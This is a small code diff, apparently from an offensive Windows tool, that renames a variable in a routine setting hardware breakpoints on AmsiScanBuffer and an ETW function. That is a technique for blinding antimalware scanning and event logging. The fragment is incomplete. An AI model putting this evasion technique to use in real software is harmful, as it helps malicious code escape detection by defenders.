@@ -15,7 +15,7 @@ BOOL init = FALSE;
    uintptr_t amsiPatchAddr = (uintptr_t)GetProcAddress(LoadLibraryA("amsi.dll"), "AmsiScanBuffer");
    
    
-   if(initialize == TRUE)
+   if(init == TRUE)
    {
 	   set_hardware_breakpoints(etwPatchAddr, 0, FALSE, 0);
 	   set_hardware_breakpoints(amsiPatchAddr, 1, FALSE, 0);
